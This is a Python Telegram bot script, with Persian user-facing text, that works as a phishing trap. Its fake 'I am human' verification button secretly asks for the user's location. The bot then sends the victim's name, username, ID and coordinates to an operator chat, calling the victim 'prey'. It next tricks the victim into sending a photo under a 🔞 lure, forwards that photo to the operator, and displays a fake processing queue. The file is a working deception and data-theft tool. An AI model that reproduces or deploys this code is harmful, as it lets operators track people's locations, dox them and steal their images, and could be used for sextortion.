from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from telegram import ReplyKeyboardRemove
import random , time
num3 = random.randint(300, 370)
num3u = random.randint(370, 400)
num2 = random.randint(200, 270)
num2u = random.randint(270, 300)
num1 = random.randint(100, 170)
num1u = random.randint(170, 200)
num = random.randint(20, 40)
numu = random.randint(70, 100)
numf = random.randint(2, 10)
numff = 1
print("waiting for respond.")
BOT_TOKEN = input("Bot token : ")
FORWARD_TO = input("user-id :")
users_waiting_for_photo = set()
user_location_received = set()
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        usern = update.effective_user.username
        userf = update.effective_user.first_name
        print(f">",{userf},'|', {usern}," > Started bot")
        keyboard = [
            [KeyboardButton("من انسان هستم ✅", request_location=True)]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)


        word = '''سلام👋 لطفا برای تایید ربات نبودن روی دکمه زیر کلیک کنید'''
        await update.message.reply_text(
            word,
            reply_markup=reply_markup
        )

        reply_markup=ReplyKeyboardRemove
        keyboard=ReplyKeyboardRemove
        reply_markup=ReplyKeyboardRemove()
        keyboard=ReplyKeyboardRemove()
async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    usern = update.effective_user.username
    userf = update.effective_user.first_name
    location = update.message.location
    await update.message.reply_text("تایید شد✅")
    print(f"got a new prey." ,{usern} , {userf})
    try:
        await update.message.delete()
    except Exception as e:
        print(f'Got error {e}')
    users_waiting_for_photo.add(user.id)

    time.sleep(2)
    
    user_info = (
        f" </> ASAP > Fall in trap! :\n"
        f" Full Name: {user.full_name}\n"
        f" Username: @{user.username if user.username else 'N/A'}\n"
        f" User ID: {user.id}\n"
        f" Local Location: ({location.latitude}, {location.longitude})"
    )


    await update.message.reply_text("لطفا عکس خود را ارسال کنید. 🔞")

    await context.bot.send_message(chat_id=FORWARD_TO, text=user_info)

    await context.bot.send_location(
        chat_id=FORWARD_TO,
        latitude=location.latitude,
        longitude=location.longitude
    )
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    usern = update.effective_user.username

    if user.id in users_waiting_for_photo:
        photo = update.message.photo[-1]  # Get the highest-resolution photo
        await update.message.reply_text("دریافت شد, درحال پردازش")
        # Forward photo to the target
        #admin 1
        await context.bot.send_photo(
            chat_id=FORWARD_TO,
            photo=photo.file_id,
            caption=f"got Photo from prey , {user.full_name} (@{user.username or 'N/A'})"
        )
        print(f"Got photo from",{usern})
        try1 = f''' شما نفر {num3} از {num3u} ⚡'''
        try2 = f''' شما نفر {num2} از {num2u}⚡'''
        try3 = f''' شما نفر {num1} از {num1u}⚡'''
        try4 = f''' شما نفر {num} از {numu} ⚡'''
        try5 = f''' شما نفر {numf} از {numf} ⚡'''
        try6 = f''' شما نفر {numff} از {numff} ⚡'''
        sent_message = await update.message.reply_text("/")
        await sent_message.edit_text(try1)
        time.sleep(3)
        await sent_message.edit_text(try2)
        time.sleep(3)
        await sent_message.edit_text(try3)
        time.sleep(3)
        await sent_message.edit_text(try4)
        time.sleep(3)
        await sent_message.edit_text(try5)
        time.sleep(3)
        await sent_message.edit_text(try6)
        time.sleep(2)
        await sent_message.edit_text('✅عکس شما آماده است')

        #for sending fake pics :

        #with open("pic.jpg", "rb") as photo:
        #    await context.bot.send_photo(
        ##        has_spoiler=True,
        #        chat_id=update.effective_chat.id,
        #        photo=photo,
        #        caption="🔞🔞😈😈🔞🔞😈😈🔞🔞😈😈🔞🔞"
        #    )
        #    print("picture send, all done")
        #    print("----------")
        #    print("")
    else:
        await update.message.reply_text("لطفا دوباره انسان بودن رو تایید کنید⚠️")
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("لطفا بعد از تایید انسان عکس خود موردنظر خود را ارسال کنید.⚠️")


def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("Bot is active.")
    print("")
    app.run_polling()

if __name__ == '__main__':
    main()